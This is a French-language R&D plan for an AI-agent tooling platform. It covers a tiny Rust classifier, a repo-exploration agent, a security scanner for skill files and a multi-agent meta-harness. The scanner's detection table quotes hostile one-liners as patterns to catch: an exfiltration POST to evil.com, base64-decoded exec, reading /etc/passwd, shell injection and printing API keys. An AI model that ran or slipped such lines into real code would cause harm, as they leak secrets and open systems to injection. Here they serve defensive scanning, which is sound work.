# 🧦 Botte Secrète v2 — Plan R&D Global

> **Date :** 25 Juin 2026
> **Sources :**
> - YouTube/Fahd Mirza — FastContext 4B (sous-agent exploration repo)
> - YouTube/Codeically — Neural Network in Rust from scratch
> - YouTube/Cole Medin — Omnigent Meta-Harness
> - User request — Security scanner pour skills/.py

---

## 🎯 Vision

Botte Secrète v2 ajoute 4 piliers à la plateforme existante (auto_router, conductor, solvers, cluster) :

```
┌─────────────────────────────────────────────────────────────┐
│                    BOTTE SECRÈTE v2                         │
├─────────────────────────────────────────────────────────────┤
│  Skills existantes (v1.4.0)                                 │
│  ├─ auto_router     — routing effort-based local↔cloud      │
│  ├─ solvers         — OR-Tools stdlib (assign/bin/schedule) │
│  ├─ conductor       — plan → executor                       │
│  ├─ cluster         — scheduler multi-machine               │
│  ├─ llm_backends    — découverte LLM locale                 │
│  ├─ skill_finder    — sélection skill 0-token               │
│  ├─ nlp_deterministic — classify/extract sans LLM           │
│  └─ control_loop    — apprentissage du router               │
│                                                             │
│  v2 — 4 nouveaux piliers                                    │
│  ├─ (A) Tiny Rust NN      — réseau neuronal minimal         │
│  ├─ (B) FastContext Agent — exploration repo spécialisée    │
│  ├─ (C) Security Scanner  — scan supply chain skills        │
│  └─ (D) Meta-Harness      — orchestration multi-agent       │
└─────────────────────────────────────────────────────────────┘
```

---

## (A) Tiny Rust Neural Network — `skills/tiny_nn/`

### Concept
Un réseau de neurones minimal en Rust (feedforward, 2-3 couches, < 50KB binaire) qui remplace **les appels LLM les plus triviaux** par une inference locale, déterministe, 0 token.

### Use cases prioritaires

| Tâche | Input | Output | Remplaçant | Tokens économisés |
|-------|-------|--------|-----------|-------------------|
| Classification effort | path, size, lang, extension | local/cloud/both | auto_router.estimate_effort() | ~200/call |
| Détection task_type | prompt features, file types | code/chat/reasoning/vision | conductor.task_classify() | ~150/call |
| Anomalie log | error line, freq, context | normal/suspicious/critical | checkup.log_scan() | ~300/call |
| Binary routing | timestamp, load, queue | proceed/delay/skip | control_loop.decide() | ~100/call |

### Architecture Rust proposée

```
botte-nn/
├── Cargo.toml          # Minimal deps (ndarray, no_std si possible)
├── src/
│   ├── lib.rs          # Matrice, couche, activation (ReLU, sigmoid)
│   ├── inference.rs    # Forward pass uniquement (entraînement en Python)
│   ├── quantized.rs    # Entiers 8-bit pour ARM/WASM
│   └── python/         # Liaison PyO3 expose `predict(features: list[float]) -> list[float]`
├── training/
│   └── train.py        # Entraînement en Python, exporte des poids en .npz/.json
└── tests/
    └── test_model.rs   # Tests d'inférence déterministes
```

### Format export poids
```json
{
  "layers": [4, 16, 8, 3],
  "weights": [[...], [...], [...]],
  "biases": [[...], [...], [...]],
  "activations": ["relu", "relu", "softmax"]
}
```

### Entraînement
- Python avec `numpy` uniquement (0 dépendance ML)
- Jeu d'entraînement : échantillons de logs/tâches réels de Botte Secrète
- Pas de GPU nécessaire (< 1000 échantillons)
- Export → Rust binary via `include_bytes!()`

### Impact tokens
- **~600 tokens/session** économisés (estimé basé sur les 4 use cases)
- **0 token** par appel après chargement du binaire
- **0 latence réseau**, **0 dépendance**

---

## (B) FastContext Agent — `skills/fast_context/`

### Concept
Microsoft FastContext-1.0-4B-SFT est un modèle 4B dédié à l'exploration de repo (READ/GLOB/GREP). Il réduit de **60% les tokens du main agent** qui ne fait plus que raisonner sur le contexte déjà collecté.

Dans Botte Secrète, on implémente ce pattern **sans LLM** : un agent déterministe qui connaît la structure du repo et sait quoi chercher.

### Pipeline

```
Main Agent (conductor)
    │ "explore: find all DB connection patterns"
    ▼
FastContext Agent
    │ 1. Parse la requête → type de recherche
    │ 2. GLOB → grep → read ciblés
    │ 3. Résultat compact : fichier:ligne → snippet
    │ 4. Livre UNIQUEMENT ce qui est pertinent
    ▼
Main Agent (conductor)
    │ Reçoit le contexte → résout la tâche
```

### Use cases

| Requête | Action FastContext | Économie |
|---------|-------------------|----------|
| "trouve les dépendances" | grep imports → fichiers clés | -70% tokens |
| "comprends cette fonction" | grep def, usages, docstring | -60% tokens |
| "où sont les tests ?" | glob tests/* → liste fichiers | -50% tokens |
| "cherche pattern X" | grep pattern + contexte fichier | -80% tokens |
| "audit sécurité" | grep eval/subprocess/os.system | -90% tokens |

### Intégration Botte

```
skills/fast_context/
├── SKILL.md
├── __init__.py
├── agent.py        # Ordonnanceur : parse requête → exécute
├── readers.py      # READ, GLOB, GREP wrappers
├── ranker.py       # Score chaque résultat par pertinence
├── compiler.py     # Compile le rapport compact
├── cli.py          # python -m skills.fast_context.cli explore <requête>
└── store.py        # Cache LRU des résultats (TTL 30s)
```

### Différence avec FastContext Microsoft
| Aspect | Microsoft FastContext | Botte FastContext |
|--------|---------------------|-------------------|
| Modèle | 4B LLM (transformer) | Logique déterministe |
| Tokens | ~1-2K par exploration | 0 token (stdio calls) |
| Dépendance | HuggingFace, vLLM | Python stdlib |
| Vitesse | ~500ms GPU | ~5ms CPU |
| Précision | Compréhension NL avancée | Pattern matching + heuristiques |

**Avantage Botte :** 0 token, 0 GPU, 0 dépendance. Suffisant car les patterns de recherche sont prévisibles.

---

## (C) Security Scanner — `skills/security_scanner/`

### Concept
Scanner les skills `.py`, les MCP servers, et les pipelines pour détecter du code malveillant, des backdoors, des imports dangereux.

### Checks

| Check | Détection | Exemple |
|-------|-----------|---------|
| Dangerous imports | `eval`, `exec`, `compile`, `__import__` | `eval(user_input)` ❌ |
| Network exfiltration | `urllib`/`requests` vers IP non-whitelist | `requests.post("evil.com/data")` ❌ |
| File system abuse | `open(..., "w")` hors périmètre | `open("/etc/passwd")` ❌ |
| Subprocess injection | `shell=True` + concat input | `subprocess.run(f"rm {file}")` ❌ |
| Obfuscation | `base64`, `xor`, `bytes([...]).decode()` | `exec(base64.b64decode("..."))` ❌ |
| Crypto | Hardcoded keys, weak algorithms | `RSA.generate(512)` ❌ |
| Environment leak | `os.environ` → print/send | `print(os.environ["API_KEY"])` ❌ |
| Import chain | Malicious package in dependency tree | `pip install typ0sqlinjection` ❌ |

### Intégration pipeline

```
Pre-commit hook
    └── security_scanner scan . --fail-on critical
         │
         ▼
CI/CD (GitHub Actions)
    └── Botte PR checkup security step
         │
         ▼
Nightly audit (cron)
    └── security_scanner audit skills/ --format json
```

### Architecture

```
skills/security_scanner/
├── SKILL.md
├── __init__.py
├── scanner.py        # Scan orchestrator (per-file)
├── patterns.py       # Pattern DB (regex + AST)
├── ast_checker.py    # Python AST static analysis
├── report.py         # Rapport compact
├── rules/            # YAML rules extensibles
│   ├── dangerous-imports.yaml
│   ├── network-exfil.yaml
│   └── crypto.yaml
├── cli.py
└── test_security_scanner.py
```

---

## (D) Meta-Harness — `skills/meta_harness/`

### Concept
Omnigent est un meta-harness open-source (Apache 2.0) qui orchestre Claude Code, Codex, et Pi sous une même session avec governance, cross-review, et sessions persistantes.

Dans Botte Secrète, le meta-harness orchestre les **skills Botte** comme des agents interchangeables.

### Architecture

```
Meta-Harness
├── Runner        → Execute une séquence d'étapes
├── Orchestrator → Planifie → Délègue → Review
├── Sandbox      → Chaque agent dans son worktree isolé
├── Governance   → Garde-fous, approbation humaine, budgets
└── Session      → Persistance terminal ↔ browser ↔ phone
```

### Flux typique

```
1. USER: "audit + fix mon projet"
2. Meta-Harness:
   └── Plan: [audit] → [review] → [fix] → [test]
   ├── Sandbox 1: Porthos audit (skills/directives_audit)
   ├── Sandbox 2: Rochefort counter-audit (skills/cardinal)
   ├── Sandbox 3: d'Artagnan fix (skills/fix)
   └── Sandbox 4: run tests
3. Governance: approval gate avant chaque apply
4. Report: synthèse multi-agent
```

### Intégration skills Botte

| Agent | Skill | Rôle dans Meta-Harness |
|-------|-------|------------------------|
| Porthos | directives_audit | Audit initial |
| Rochefort | cardinal | Contre-audit (red team) |
| d'Artagnan | fix | Correction |
| Aramis | optimize | Optimisation token |
| Conductor | conductor | Planification |
| Router | auto_router | Choix local vs cloud |

---

## 📊 Impact tokens estimé

| Pilier | Tokens/session | Effort | ROI |
|--------|---------------|--------|-----|
| (A) Tiny Rust NN | -600 | 3 jours | ⭐⭐⭐ |
| (B) FastContext | -5000 | 2 jours | ⭐⭐⭐⭐ |
| (C) Security Scanner | -200 (indirect) | 1 jour | ⭐⭐ |
| (D) Meta-Harness | -2000 (indirect) | 5 jours | ⭐⭐⭐ |

**Total v2 : ~7800 tokens/session économisés** → cible self-audit 90+/100

---

## 🔴 Priorisation recommandée

| Phase | Sujet | Effort | Impact | Dépend de |
|-------|-------|--------|--------|-----------|
| **1** | **(B) FastContext Agent** | 2 jours | ⭐⭐⭐⭐ | Rien |
| **2** | **(A) Tiny Rust NN** | 3 jours | ⭐⭐⭐ | Rust installé |
| **3** | **(C) Security Scanner** | 1 jour | ⭐⭐ | FastContext readers |
| **4** | **(D) Meta-Harness** | 5 jours | ⭐⭐⭐ | Tous les autres |

**Pourquoi FastContext d'abord :** plus gros impact token (5000/session), pur Python (pas de nouvelle techno), réutilise les skills existantes (skill_finder, llm_backends).

---

## ⚡ Exécution Phase 1 — FastContext Agent

Si validé, les sous-étapes :

1. **Créer** `skills/fast_context/` avec `agent.py`, `readers.py`, `ranker.py`
2. **Définir** les 5 types de requêtes (imports, fonction, tests, pattern, audit)
3. **Implémenter** le ranker par pertinence
4. **Compiler** le rapport compact (fichier:ligne → snippet)
5. **Intégrer** dans le pipeline conductor
6. **Tester** sur 3 repos réels
7. **Mesurer** l'économie token avant/après

---

*Plan généré le 2026-06-25 — prêt pour exécution.*
